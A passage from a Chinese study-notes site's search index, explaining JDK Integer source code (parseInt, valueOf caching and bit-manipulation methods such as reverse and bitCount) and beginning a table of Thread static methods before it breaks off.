\u53ea\u6709\u7b26\u53f7\u7684\u60c5\u51b5\n                throw NumberFormatException.forInputString(s, radix);\n            }\n            i++;\n        }\n        // \u7531\u4e8e\u7b26\u53f7\u95ee\u9898\uff0c\u8fd9\u662f\u6700\u5927\u56e0\u5b50\u7684\u76f8\u53cd\u6570\uff0c\u7528\u6765\u68c0\u67e5\u89e3\u6790\u7ed3\u679c\u7684\u8303\u56f4\uff0c\u5c3d\u53ef\u80fd\u63d0\u524d\u68c0\u6d4b\u51fa\u5185\u5b58\u6ea2\u51fa\uff08\u8d85\u51fa\u8303\u56f4\uff09\u7684\u60c5\u51b5\n        int multmin = limit / radix; \n        int result = 0;\n        while (i &lt; len) {\n            // \u5728\u8d1f\u65b9\u5411\u7d2f\u52a0\u6570\u503c\uff0c\u9632\u6b62\u8d85\u51fa\u6700\u5927\u503c\n            int digit = Character.digit(s.charAt(i++), radix);\n            if (digit &lt; 0 || result &lt; multmin) {\n                throw NumberFormatException.forInputString(s, radix);\n            }\n            result *= radix;\n            if (result &lt; limit + digit) {\n                throw NumberFormatException.forInputString(s, radix);\n            }\n            result -= digit;\n        }\n        return negative ? result : -result;\n    } else {\n        throw NumberFormatException.forInputString(s, radix);\n    }\n}\n</code></pre> <p>\u5927\u81f4\u7684\u8fc7\u7a0b\u6982\u62ec\u4e3a\uff1a</p> <ul> <li>\u9a8c\u8bc1\u5b57\u7b26\u4e32\u5408\u6cd5</li> <li>\u5224\u65ad\u7b26\u53f7</li> <li>\u89e3\u6790\u6570\u503c</li> </ul> <p>\u5176\u4e2d\u5728\u89e3\u6790\u6570\u503c\u65f6\u6211\u4eec\u53d1\u73b0\uff0c\u4ed6\u5c45\u7136\u7528\u8d1f\u6570\u6765\u5904\u7406\u6570\u503c\u90e8\u5206\u3002\u4e3a\u5565\u4e0d\u7528\u6b63\u6570\u5462\uff1f\u4ece\u4e00\u7bc7\u535a\u5ba2\u4e2d\u627e\u5230\u7b54\u6848\u3002java parent\u51fd\u6570</p> <p>\u4e25\u8c28\u662f\u8fd9\u6bb5\u7a0b\u5e8f\u6700\u5927\u7684\u7279\u70b9\uff0c\u56e0\u4e3a\u6709\u7b26\u53f7int\u7684\u4e0a\u4e0b\u9650\u662f-2147483648~2147483647\uff0c\u53ef\u89c1\u8d1f\u6570\u8868\u8fbe\u7684\u8303\u56f4\u6bd4\u6b63\u6570\u591a\u4e00\u4e2a\uff0c\u8fd9\u6837\u5c31\u597d\u7406\u89e3\u4e3a\u4ec0\u4e48\u5728\u5f00\u5934\u8981\u628alimit\u5168\u90e8\u8868\u8fbe\u4e3a\u8d1f\u6570(\u4e0b\u9650)\uff0c\u8fd9\u6837\u7684\u64cd\u4f5c\u51cf\u5c11\u4e86\u540e\u7eed\u7684\u5224\u65ad\uff0c\u53ef\u4ee5\u4e00\u6b65\u5230\u4f4d\uff0c\u76f8\u5f53\u4e8e\u4e8c\u8005\u9009\u62e9\u53d6\u5176\u5927\u4e00\u6837\uff0c\u5927\u7684\u5305\u542b\u4e86\u5c0f\u7684\u3002\u540c\u7406\uff0c\u90a3\u4e48multmin\u4e5f\u5c31\u662f\u8d1f\u6570\u4e86\uff0c\u800c\u4e14\u53ef\u4ee5\u8ba4\u4e3a\u662f\u53ea\u548c\u8fdb\u5236\u53c2\u6570radix\u6709\u5173\u7cfb\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u8bbe\u4f7f\u7528\u6b63\u6570\u89e3\u6790\u6570\u503c\uff0c\u73b0\u5728\u6211\u4eec\u8981\u89e3\u6790<code>\u201c-2147483648\u201d</code>\uff0c\u9996\u5148\u5b57\u7b26\u4e32\u5408\u6cd5\uff0c\u7b26\u53f7\u4e3a\u8d1f\uff0c\u7136\u540e\u5904\u7406\u6570\u503c\u90e8\u5206\uff0c\u4f46\u662f\u5bf9\u4e8e\u6b63\u6570\u6765\u8bb2\uff0c\u6700\u5927\u7684\u6570\u662f2147483647\uff0c\u56e0\u6b64\u5728\u89e3\u6790\u65f6\u5c31\u4f1a\u53d1\u751f\u5185\u5b58\u6ea2\u51fa\uff0c\u65e0\u6cd5\u89e3\u6790\u51fa\u6b63\u786e\u7684\u7ed3\u679c\u3002\u800c\u662f\u7528\u8d1f\u6570\u4e5d\u53ef\u4ee5\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u3002</p> <ul> <li>\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u8fd4\u73b0\u4e00\u4e2a\u4e5f\u53ef\u4ee5\u7528\u6765\u89e3\u6790\u6570\u503c\u7684\u65b9\u6cd5<code>valueOf()</code>\uff0c\u90a3\u4e48<code>valueOf()</code>\u548c\u4e0a\u9762\u7684<code>parseInt()</code>\u6709\u4ec0\u4e48\u533a\u522b\u5462\uff1f</li> </ul> <pre><code>public static Integer valueOf(String s, int radix) throws NumberFormatException {\n    return Integer.valueOf(parseInt(s,radix));\n}\n\npublic static Integer valueOf(String s) throws NumberFormatException {\n    return Integer.valueOf(parseInt(s, 10));\n}\n\npublic static Integer valueOf(int i) {\n    // -128~127\u65f6\uff0c\u88ab\u8ba4\u4e3a\u662f\u5728\u7f13\u5b58\u6c60\u4e2d\u7684\n    if (i &gt;= IntegerCache.low &amp;&amp; i &lt;= IntegerCache.high)\n        return IntegerCache.cache[i + (-IntegerCache.low)];\n    return new Integer(i);\n}\n</code></pre> <p>\u8fd9\u662f<code>valueOf()</code>\u65b9\u6cd5\u7684\u4e09\u4e2a\u5177\u4f53\u4ee3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0</p> <ul> <li><code>valueOf()</code>\u8fd4\u56de\u7684\u662f\u4e00\u4e2aInteger\u5bf9\u8c61</li> <li>\u5f53\u503c\u7684\u5728-128~127\u65f6\uff0c\u4e0d\u4f1a\u65b0\u5efa\u4e00\u4e2a\u5bf9\u8c61\uff0c\u800c\u662f\u8fd4\u56de\u4e00\u4e2a\u7f13\u5b58\u533a\u7684\u4e00\u4e2a\u503c\u3002</li> <li> <p>\u603b\u4f53\u6765\u8bb2\u4f7f\u7528\u7684\u65f6\u5019\u6ca1\u5565\u533a\u522b\uff0c\u56e0\u4e3a\u5f53\u4f60\u9700\u8981\u4f7f\u7528\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0cJava\u4e5f\u4f1a\u6709\u81ea\u52a8\u88c5\u5305\u673a\u5236\u3002</p> </li> <li> <p>Integer\u7c7b\u4e2d\u7684\u4e00\u4e9b\u7279\u6b8a\u7684\u5de5\u5177\u65b9\u6cd5</p> </li> </ul> \u51fd\u6570\u540d \u8bf4\u660e \u5b9e\u4f8b static int reverseBytes(int i) \u5c06\u6570\u503c\u6309\u5b57\u8282\u7ffb\u8f6c 0xABCDEFFF ==&gt; 0xFFFEDCBA static int reverse(int i) \u5c06\u6570\u503c\u6309\u7167\u4e8c\u8fdb\u5236\u4f4d\u53cd\u8f6c (10110111)<sub>2</sub> ==&gt; (11101101)<sub>2</sub> \u8fd9\u91cc\u53ea\u6f14\u793a8bit\uff0c\u4f46\u5b9e\u9645\u662f32bit\u7684\u53cd\u8f6c static int signum(int i) \u8fd4\u56deint\u6570\u503c\u7684\u7b26\u53f7\u3010-1=\u300b\u8d1f\uff1b0=\u300b0\uff1b1=\u300b\u6b63\u3011 -2  ==\u300b -1\uff1b static int rotateRight(int i, int distance) \u5c06i\u6309\u7167\u4e8c\u8fdb\u5236\u5411\u53f3\u5faa\u73af\u79fb\u52a8distance\u4f4d (10110111)<sub>2</sub> =\u53f3\u79fb1bit=\u300b(11011011)<sub>2</sub> <sub>2</sub> \u8fd9\u91cc\u53ea\u6f14\u793a8bit\uff0c\u4f46\u5b9e\u9645\u662f32bit\u7684\u5faa\u73af static int rotateLeft(int i, int distance) \u5c06i\u6309\u7167\u4e8c\u8fdb\u5236\u5411\u5411\u5de6\u5faa\u73af\u79fb\u52a8distance\u4f4d (10110111)<sub>2</sub> =\u5de6\u79fb1bit=\u300b(01101111)<sub>2</sub> \u8fd9\u91cc\u53ea\u6f14\u793a8bit\uff0c\u4f46\u5b9e\u9645\u662f32bit\u7684\u5faa\u73af static int bitCount(int i) \u8fd4\u56dei\u7684\u4e8c\u8fdb\u5236\u4e2d1\u7684\u4e2a\u6570 (10110111)<sub>2</sub> ==\u300b 6 static int numberOfTrailingZeros(int i) \u8fd4\u56dei\u7684\u4e8c\u8fdb\u5236\u4e2d\u672b\u5c3e\u7684\u8fde\u7eed\u76840\u7684\u4e2a\u6570 (01110100)2<sub>2</sub> ==\u300b2 static int numberOfLeadingZeros(int i) \u8fd4\u56dei\u7684\u4e8c\u8fdb\u5236\u4e2d\u5f00\u5934\u7684\u8fde\u7eed\u76840\u7684\u4e2a\u6570 (01110100)2<sub>2</sub> ==\u300b1 static int lowestOneBit(int i) \u8fd4\u56dei\u7684\u4e8c\u8fdb\u5236\u4e2d\u7684\u6700\u4f4e\u4f4d\u7684\u4e00\u4e2a1\uff0c\u539f\u4f4d\u7f6e\u8fd4\u56de (01110100)2<sub>2</sub> ==\u300b(00000100)<sub>2</sub> static int highestOneBit(int i) \u8fd4\u56dei\u7684\u4e8c\u8fdb\u5236\u4e2d\u7684\u6700\u9ad8\u4f4d\u7684\u4e00\u4e2a1\uff0c\u539f\u4f4d\u7f6e\u8fd4\u56de (01110100)2<sub>2</sub> ==\u300b(01000000)<sub>2</sub> <p>\u4ee5\u4e0a\u5e76\u4e0d\u662fInteger\u4e2d\u7684\u5168\u90e8\u5de5\u5177\u65b9\u6cd5\uff0cInteger\u4e2d\u7684\u5de5\u5177\u65b9\u6cd5\u8fd8\u6709\u5f88\u591a\uff0c\u800c\u6211\u4eec\u4e4b\u6240\u4ee5\u8981\u628a\u4ee5\u4e0a\u7684\u65b9\u6cd5\u7f57\u5217\u51fa\u6765\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u8981\u5b66\u4e60\u4ed6\u4eec\u7684\u4e8c\u8fdb\u5236\u5904\u7406\u65b9\u5f0f\u3002</p> <ul> <li> <p><code>static int reverseBytes(int i)</code></p> <pre><code>public static int reverseBytes(int i) {\n    return ((i &gt;&gt;&gt; 24)           ) |    // \u53d64byte\u5e76\u79fb\u52a8\u5230 1byte\uff0c\u5176\u4ed6\u4f4d\u4e3a1(\u4e3a\u4e0e\u8fd0\u7b97\u670d\u52a1)\n           ((i &gt;&gt;   8) &amp;   0xFF00) |    // \u53d63byte\u5e76\u79fb\u52a8\u5230 2byte\uff0c\u5176\u4ed6\u4f4d\u4e3a0\n           ((i &lt;&lt;   8) &amp; 0xFF0000) |    // \u53d62byte\u5e76\u79fb\u52a8\u5230 3byte\uff0c\u5176\u4ed6\u4f4d\u4e3a0\n           ((i &lt;&lt; 24));                 // \u53d61byte\u5e76\u79fb\u52a8\u5230 4byte\uff0c\u5176\u4ed6\u4f4d\u4e3a0\n}\n</code></pre> <p>\u8fd9\u4e2a\u903b\u8f91\u4e0d\u662f\u5f88\u590d\u6742\uff1a\u5c31\u662f\u4ea4\u6362\u51e0\u4e2abyte\u4f4d\u7f6e\u4e4b\u540e\u5408\u5e76</p> </li> <li> <p><p><code>static int reverse(int i)</code></p></p> <pre><code>public static int reverse(int i) {\n    // HD, Figure 7-1\n    i = (i &amp; 0x55555555) &lt;&lt; 1 | (i &gt;&gt;&gt; 1) &amp; 0x55555555;//\u4e24\u4f4d\u4e00\u7ec4\u4e92\u76f8\u4ea4\u6362\n    i = (i &amp; 0x33333333) &lt;&lt; 2 | (i &gt;&gt;&gt; 2) &amp; 0x33333333;//\u56db\u4f4d\u4e00\u7ec4\u4e92\u76f8\u4ea4\u6362\n    i = (i &amp; 0x0f0f0f0f) &lt;&lt; 4 | (i &gt;&gt;&gt; 4) &amp; 0x0f0f0f0f;//\u516b\u4f4d\u4e00\u7ec4\u4e92\u76f8\u4ea4\u6362\n    i = (i &lt;&lt; 24) | ((i &amp; 0xff00) &lt;&lt; 8) |\n        ((i &gt;&gt;&gt; 8) &amp; 0xff00) | (i &gt;&gt;&gt; 24);  // \u7b2c\u56db\u6b21\u8d4b\u503c\u548creverseBytes\u7684\u4ee3\u7801\u4f5c\u7528\u662f\u4e00\u6837\u7684\n    return i;\n}\n</code></pre> <p>NewBing\uff1a\u8fd9\u6bb5\u6587\u5b57\u662f\u4e00\u4e2aJava\u7a0b\u5e8f\uff0c\u7528\u4e8e\u5c06\u4e00\u4e2a\u6574\u6570\u7684\u4e8c\u8fdb\u5236\u4f4d\u53cd\u8f6c\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8f93\u5165\u662f00000001\uff0c\u8f93\u51fa\u5c31\u662f10000000\u3002\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ul> <li>\u9996\u5148\uff0c\u5c06\u8f93\u5165\u7684\u6574\u6570i\u6309\u7167\u6bcf\u4e24\u4f4d\u4e00\u7ec4\u8fdb\u884c\u5206\u5272\uff0c\u7136\u540e\u4ea4\u6362\u6bcf\u7ec4\u7684\u4e24\u4f4d\u3002\u4f8b\u5982\uff0c\u5982\u679ci\u662f01011011\uff0c\u90a3\u4e48\u5206\u5272\u540e\u5f97\u523001 01 10 11\uff0c\u4ea4\u6362\u540e\u5f97\u523010 10 01 11\u3002\u8fd9\u4e00\u6b65\u7528\u4e86\u4e00\u4e2a\u4f4d\u8fd0\u7b97\u7b26&amp;\u548c\u4e00\u4e2a\u79fb\u4f4d\u8fd0\u7b97\u7b26&gt;&gt;&gt;\u3002</li> <li>\u7136\u540e\uff0c\u5c06\u4e0a\u4e00\u6b65\u7684\u7ed3\u679c\u6309\u7167\u6bcf\u56db\u4f4d\u4e00\u7ec4\u8fdb\u884c\u5206\u5272\uff0c\u7136\u540e\u4ea4\u6362\u6bcf\u7ec4\u7684\u56db\u4f4d\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e0a\u4e00\u6b65\u7684\u7ed3\u679c\u662f10100111\uff0c\u90a3\u4e48\u5206\u5272\u540e\u5f97\u52301010 0111\uff0c\u4ea4\u6362\u540e\u5f97\u52300111 1010\u3002\u8fd9\u4e00\u6b65\u4e5f\u7528\u4e86\u4e00\u4e2a\u4f4d\u8fd0\u7b97\u7b26&amp;\u548c\u4e00\u4e2a\u79fb\u4f4d\u8fd0\u7b97\u7b26&gt;&gt;&gt;\u3002</li> <li>\u63a5\u7740\uff0c\u5c06\u4e0a\u4e00\u6b65\u7684\u7ed3\u679c\u6309\u7167\u6bcf\u516b\u4f4d\u4e00\u7ec4\u8fdb\u884c\u5206\u5272\uff0c\u7136\u540e\u4ea4\u6362\u6bcf\u7ec4\u7684\u516b\u4f4d\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e0a\u4e00\u6b65\u7684\u7ed3\u679c\u662f01111010\uff0c\u90a3\u4e48\u5206\u5272\u540e\u5f97\u523001111010\uff0c\u4ea4\u6362\u540e\u5f97\u523010101111\u3002\u8fd9\u4e00\u6b65\u4e5f\u7528\u4e86\u4e00\u4e2a\u4f4d\u8fd0\u7b97\u7b26&amp;\u548c\u4e00\u4e2a\u79fb\u4f4d\u8fd0\u7b97\u7b26&gt;&gt;&gt;\u3002</li> <li>\u6700\u540e\uff0c\u5c06\u4e0a\u4e00\u6b65\u7684\u7ed3\u679c\u6309\u7167\u6bcf\u5341\u516d\u4f4d\u4e00\u7ec4\u8fdb\u884c\u5206\u5272\uff0c\u7136\u540e\u4ea4\u6362\u6bcf\u7ec4\u7684\u5341\u516d\u4f4d\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e0a\u4e00\u6b65\u7684\u7ed3\u679c\u662f10101111\uff0c\u90a3\u4e48\u5206\u5272\u540e\u5f97\u523000000000 10101111\uff0c\u4ea4\u6362\u540e\u5f97\u523010101111 00000000\u3002\u8fd9\u4e00\u6b65\u7528\u4e86\u4e00\u4e2a\u79fb\u4f4d\u8fd0\u7b97\u7b26&lt;&lt;\u548c\u4e00\u4e2a\u6216\u8fd0\u7b97\u7b26|\u3002</li> </ul> <p>\u8fd9\u6837\u5c31\u5b8c\u6210\u4e86\u6574\u6570\u7684\u4e8c\u8fdb\u5236\u4f4d\u53cd\u8f6c\uff0c\u5e76\u8fd4\u56de\u6700\u7ec8\u7684\u7ed3\u679c\u3002\u53ef\u53c2\u8003\uff1a</p> <p>\u3010\u4f4d\u64cd\u4f5c\u7b14\u8bb0\u3011\u8be6\u89e3\u4e00\u79cd\u9ad8\u6548\u4f4d\u53cd\u8f6c\u7b97\u6cd5_\u4f4d\u53cd\u8f6c\u64cd\u4f5c-CSDN\u535a\u5ba2</p> </li> <li> <p><code>static int bitCount(int i)</code></p> <pre><code>public static int bitCount(int i) {\n    // HD, Figure 5-2\n    i = i - ((i &gt;&gt;&gt; 1) &amp; 0x55555555);               // \u6bcf\u4e24\u4f4d\u4e3a\u4e00\u7ec4\uff0c\u8ba1\u7b97\u4e24\u4f4d\u4e2d\u76841\u7684\u4f4d\u6570\n    i = (i &amp; 0x33333333) + ((i &gt;&gt;&gt; 2) &amp; 0x33333333);// \u6bcf\u56db\u4f4d\u4e3a\u4e00\u7ec4\uff0c\u8ba1\u7b97\u56db\u4f4d\u4e2d\u76841\u7684\u4f4d\u6570\uff08\u5c06\u4e0a\u9762\u7b97\u7684\u7ed3\u679c\u76f8\u52a0\uff09\n    i = (i + (i &gt;&gt;&gt; 4)) &amp; 0x0f0f0f0f;               // \u6bcf\u516b\u4f4d\u4e3a\u4e00\u7ec4\uff0c\u8ba1\u7b97\u516b\u4f4d\u4e2d\u76841\u7684\u4f4d\u6570\uff08\u5c06\u4e0a\u9762\u7b97\u7684\u7ed3\u679c\u76f8\u52a0\uff09\n    i = i + (i &gt;&gt;&gt; 8);                              // \u6bcf16\u4f4d\u4e3a\u4e00\u7ec4\uff0c\u8ba1\u7b9716\u4f4d\u4e2d\u76841\u7684\u4f4d\u6570\uff08\u5c06\u4e0a\u9762\u7b97\u7684\u7ed3\u679c\u76f8\u52a0\uff09\n    i = i + (i &gt;&gt;&gt; 16);                             // \u5c06\u524d16\u4e3a\u7684\u7ed3\u679c\u548c\u540e16\u4f4d\u7684\u7ed3\u679c\u76f8\u52a0\n    return i &amp; 0x3f;                                // \u53d6\u4f4e\u4f4d\u76846\u4f4d\uff08\u6700\u5927\u503c\u53ea\u670932\uff0c\u56e0\u6b64\u4e0d\u53ef\u80fd\u5927\u4e8e6\u4f4d\uff09\n}\n</code></pre> <p>\u4ed4\u7ec6\u770b\u8fd9\u6bb5\u4ee3\u7801\u4f60\u4f1a\u53d1\u73b0\u5b83\u548c\u4e0a\u9762\u7684<code>reverse()</code>\u51fd\u6570\u5341\u5206\u7c7b\u4f3c\u3002\u53ef\u53c2\u8003Java Integer.bitCount()\u65b9\u6cd5\u89e3\u6790</p> <p>\u5bf9\u4e8e\u7b2c\u4e00\u4e2a\u8ba1\u7b97<code>i = i - ((i &gt;&gt;&gt; 1) &amp; 0x55555555);</code>\u53ef\u80fd\u4f1a\u7406\u89e3\u8d77\u6765\u6bd4\u8f83\u56f0\u96be\uff0c\u6211\u4eec\u5f15\u5165\u771f\u503c\u8868\uff1a</p> i (i &gt;&gt;&gt; 1) &amp; 0x55555555 i = i - ((i &gt;&gt;&gt; 1) &amp; 0x55555555) 1\u7684\u6570\u91cf 00 00 00 0 01 00 01 1 10 01 01 1 11 01 10 2 <p>\u7b80\u76f4\u592a\u5999\u4e86~</p> </li> <li> <p><code>static int signum(int i)</code></p> <pre><code>public static int signum(int i) {\n    // HD, Section 2-7\n    return (i &gt;&gt; 31) | (-i &gt;&gt;&gt; 31);\n}\n</code></pre> <p><code>i &gt;&gt; 31</code>\u901a\u8fc7\u4f4d\u79fb\u8fd0\u7b97\u7684\u7b26\u53f7\u6269\u5c55\u53d6\u7684\u7ed3\u679c\u7684\u7b26\u53f7\u4f4d</p> <p>\u7b26\u53f7\u6269\u5c55\u89c4\u5219</p> <ul> <li> <p>\u5982\u679c\u7b26\u53f7\u4f4d\u4e3a\u6b63\uff0c\u9ad8\u4f4d\u4f4e\u4f4d\u90fd\u586b0</p> </li> <li> <p>\u5982\u679c\u7b26\u53f7\u4f4d\u4e3a\u8d1f\uff0c\u9ad8\u4f4d\u586b1\uff0c\u4f4e\u4f4d\u586b0</p> </li> </ul> <p><code>-i &gt;&gt;&gt; 31</code>\u901a\u8fc7\u65e0\u7b26\u53f7\u4f4d\u79fb\u8fd0\u7b97\u53d6\u5f97\u662f\u5426\u4e3a\u7ed3\u679c\u7684\u7edd\u5bf9\u503c\u3002</p> <ul> <li>\u5982\u679ci &lt; 0\uff0c<code>i &gt;&gt; 31</code> = -1\uff0c<code>-i &gt;&gt;&gt; 31</code> = 0</li> <li>\u5982\u679ci = 0\uff0c<code>i &gt;&gt; 31</code> = 0\uff0c<code>-i &gt;&gt;&gt; 31</code> = 0</li> <li>\u5982\u679ci &gt; 0\uff0c<code>i &gt;&gt; 31</code> = 0\uff0c<code>-i &gt;&gt;&gt; 31</code> = 1</li> </ul> </li> <li> <p><code>static int rotateRight(int i, int distance)</code>  / <code>static int rotateLeft(int i, int distance)</code></p> <pre><code>public static int rotateRight(int i, int distance) {\n    return (i &gt;&gt;&gt; distance) | (i &lt;&lt; -distance);\n}\n\npublic static int rotateLeft(int i, int distance) {\n    return (i &lt;&lt; distance) | (i &gt;&gt;&gt; -distance);\n}\n</code></pre> <p>\u5de6\u79fb\u548c\u53f3\u79fb\u7684\u539f\u7406\u5927\u5dee\u4e0d\u5dee\uff0c\u4e3b\u8981\u8fd9\u91cc\u9700\u8981\u7406\u89e3<code>(i &gt;&gt;&gt; -distance)</code>\u548c<code>(i &lt;&lt;&lt; -distance)</code>\uff1b</p> <p><code>(i &gt;&gt;&gt; -distance)</code>\u7684\u4f5c\u7528\u76f8\u5f53\u4e8e\u5c06i\u7684\u5c06i \u53f3\u79fb (32-distance)\u4f4d\uff0c\u7531\u4e8e\u5faa\u73af\u53cd\u8f6c\u4e0d\u4f1a\u6539\u53d8\u9664\u4e86\u7b2c\u4e00\u4e2a\u548c\u6700\u540e\u4e00\u4e2a\u7684\u524d\u9a71\u548c\u540e\u9a71\uff0c\u56e0\u6b64\u53ef\u4ee5\u6574\u4f53\u5e73\u79fb\uff0c\u4e5f\u5c31\u662f\u5c06\u524d32-distance\u548c\u540edistance\u4f4d\u4ea4\u6362\u4f4d\u7f6e\uff0c\u5de6\u79fb\u540c\u7406\u3002</p> </li> <li> <p><code>static int numberOfTrailingZeros(int i)</code> / <code>static int numberOfLeadingZeros(int i)</code></p> <pre><code>public static int numberOfTrailingZeros(int i) {\n    // HD, Figure 5-14\n    int y;\n    if (i == 0) return 32;\n    int n = 31;\n    y = i &lt;&lt;16; if (y != 0) { n = n -16; i = y; }\n    y = i &lt;&lt; 8; if (y != 0) { n = n - 8; i = y; }\n    y = i &lt;&lt; 4; if (y != 0) { n = n - 4; i = y; }\n    y = i &lt;&lt; 2; if (y != 0) { n = n - 2; i = y; }\n    return n - ((i &lt;&lt; 1) &gt;&gt;&gt; 31);\n}\n\npublic static int numberOfLeadingZeros(int i) {\n    // HD, Figure 5-6\n    if (i == 0)\n        return 32;\n    int n = 1;\n    if (i &gt;&gt;&gt; 16 == 0) { n += 16; i &lt;&lt;= 16; }\n    if (i &gt;&gt;&gt; 24 == 0) { n +=  8; i &lt;&lt;=  8; }\n    if (i &gt;&gt;&gt; 28 == 0) { n +=  4; i &lt;&lt;=  4; }\n    if (i &gt;&gt;&gt; 30 == 0) { n +=  2; i &lt;&lt;=  2; }\n    n -= i &gt;&gt;&gt; 31;\n    return n;\n}\n</code></pre> <p>\u539f\u7406\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u901a\u8fc7\u4f4d\u79fb\u4e8c\u5206\u6cd5\u67e5\u627e\u5230\u54ea\u4e2a\u5173\u952e\u76841\u7684\u4f4d\u7f6e\uff0c\u6700\u540e\u4e00\u4e2areturn\u54ea\u91cc\u5c31\u662f\u5728\u6700\u540e\u7684\u4e24\u4e2a\u4f4d\u7f6e\u4e2d\u786e\u5b9a\u4e00\u4e2a\u4f4d\u7f6e\u3002</p> </li> <li> <p><code>static int lowestOneBit(int i)</code>  /  <code>static int highestOneBit(int i)</code></p> <pre><code>public static int lowestOneBit(int i) {\n    // HD, Section 2-1\n    return i &amp; -i;\n    // \u6b63\u6570\u53d8\u6210\u8d1f\u6570\u7684\u4e8c\u8fdb\u5236\u53d8\u5316\uff0c\u6700\u540e\u4e00\u4e2a1\u4e0d\u53d8\uff0c\u5176\u4f59\u5168\u90e8\u53d6\u53cd\uff0c\u8fd9\u6837\u548c\u539f\u672c\u53d6\u4e0e\u7684\u65f6\u5019\u5c31\u53ea\u6709\u6700\u540e\u4e00\u4f4d\u4fdd\u7559\u4e0b\u6765\u4e86\n}\n\npublic static int highestOneBit(int i) {\n    // HD, Figure 3-1\n    i |= (i &gt;&gt;  1);\n    i |= (i &gt;&gt;  2);\n    i |= (i &gt;&gt;  4);\n    i |= (i &gt;&gt;  8);\n    i |= (i &gt;&gt; 16);\n    // \u524d\u9762\u5148\u5c06\u7b2c\u4e00\u4f4d1\u4e4b\u540e\u6240\u6709\u7684\u4f4d\u53d8\u62101\uff0c\u7136\u540e\u53f3\u79fb\u4e00\u4f4d\u76f8\u51cf\uff0c\u5173\u952e\u7684\u65e0\u7b26\u53f7\u4f4d\u79fb\n    return i - (i &gt;&gt;&gt; 1);\n}\n</code></pre> <p>\u5bf9\u4e8e\u7b2c\u4e8c\u4e2a\u51fd\u6570\u7684\u5177\u4f53\u662f\u5982\u4f55\u5c06\u7b2c\u4e00\u4f4d\u4e4b\u540e\u7684\u6240\u6709\u4f4d\u53d8\u62101\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u6253\u65ad\u70b9\u8ddf\u8e2a\uff0c\u53d1\u73b0\u5176\u5b9e\u4ed6\u5c31\u662f\u5229\u7528\u7b2c\u4e00\u4f4d\u76841\u901a\u8fc7\u5206\u88c2\u6269\u6563\u7684\u65b9\u5f0f\u7ed9\u540e\u9762\u7684\u4f4d\u8d4b\u503c\u3002</p> </li> </ul>"},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_16","title":"\u591a\u7ebf\u7a0b\u7bc7","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#1-thread","title":"1. Thread","text":""},{"location":"Note/Java%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#_17","title":"\u6e90\u7801\u5206\u6790","text":"<ul> <li>\u9759\u6001\u65b9\u6cd5\uff1a</li> </ul> \u65b9\u6cd5 \u8bf4\u660e int activeCount() \u8fd4\u56de\u548c\u5f53\u524d\u7ebf\u7a0b\u5728\u540c\u4e00\u7ebf\u7a0b\u7ec4\u7684\u6d3b\u8dc3\u7684\u5e73\u53f0\u7ebf\u7a0b\u603b\u6570 int enumerate(Thread[]) \u5c06\u5f53\u524d\u7ebf\u7a0b\u6240\u5728\u7684\u7ebf\u7a0b\u7ec4\u4e2d\u7684\u5b58\u6d3b\u7684\u5e73\u53f0\u7ebf\u7a0b\u590d\u5236\u5230\u76ee\u6807\u6570\u7ec4\u4e2d\uff0c\u5e76\u8fd4\u56de\u6d3b\u8dc3\u7684\u5e73\u53f0\u7ebf\u7a0b\u603b\u6570 Thread currentThread() \u8fd4\u56de\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684\u7ebf\u7a0b\uff08java\u662f\u5426\u80fd\u591f\u5e76\u884c\u5f00\u53d1\uff09 void stackDump() \u663e\u793a\u5f53\u524d\u8fd0\u884c\u7684\u7ebf\u7a0b\u7684\u5806\u6808\u4fe1\u606f\uff08\u901a\u8fc7\u5f02\u5e38\u7c7b\u7684<code>printStackTrace()</code>\u51fd\u6570\uff09 boolean holdsLock(Object) \u5f53\u524d\u7ebf\u7a0b\u662f\u5426\u6301\u6709\u8be5\u5bf9\u8c61\u7684\u9501 boolean interrupted() \u5f53\u524d\u7ebf\u7a0b\u662f\u5426\u88ab\u4e2d\u65ad\uff0c\u5e76\u4e14\u89e3\u9664\u7ebf\u7a0b\u7684\u4e2d\u65ad\u72b6\u6001 void sleep(long) \u4f7f\u5f53\u524d\u7ebf\u7a0b\u7761\u7720\u6307\u5b9a\u7684\u6beb\u79d2\u6570\uff0c\u7ebf\u7a0b\u72b6\u6001\u8f6c\u4e3a\u6302\u8d77\uff0c\u4e0d\u91ca\u653e\u9501\uff0c\u548c\u4e0b\u9762\u76f8\u540c\u3002 void sleep(long,int) \u4f7f\u5f53\u524d\u7ebf\u7a0b\u7761\u7720\u6307\u5b9a\u7684\u6beb\u79d2\u6570\u548c\u7eb3\u79d2\u6570\uff0c\u7ebf\u7a0b\u72b6\u6001\u8f6c\u4e3a\u6302\u8d77\uff0c void yield() \u5f53\u524d\u7684\u7ebf\u7a0b\u91ca\u653eCPU\u6267\u884c\u6743\uff0c\u91cd\u65b0\u53c2\u4e0eCPU\u7ade\u4e89 void onSpinWait() since(JDK9.0)\uff0c\u4ece\u5e95\u5c42\u63d0\u9ad8\u81ea\u65cb\u9501\u7684\u6027\u80fdThread.onSpinWait-stackoverflow Builder.OfPlatform ofPlatform() since(JDK19.0)\uff0c\u8fd4\u56de\u5e73\u53f0\u7ebf\u7a0b\u7684\u5de5\u5382\u7c7b\uff0c\u53ef\u4ee5\u7528\u6765\u521b\u5efa\u5e73\u53f0\u7ebf\u7a0b\uff08\u666e\u901a\u7ebf\u7a0b\uff09 Builder.OfPlatform ofVirtual() 